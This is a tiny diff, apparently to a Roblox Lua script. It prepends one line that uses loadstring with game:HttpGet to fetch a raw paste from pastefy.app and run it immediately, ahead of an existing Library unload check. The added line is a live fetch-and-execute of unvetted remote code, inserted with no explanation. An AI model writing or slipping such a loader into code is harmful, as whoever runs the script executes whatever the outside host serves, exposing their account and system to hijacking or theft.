@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/pDhoQmem/raw"))()
 if Library then
     Library:Unload()
 end
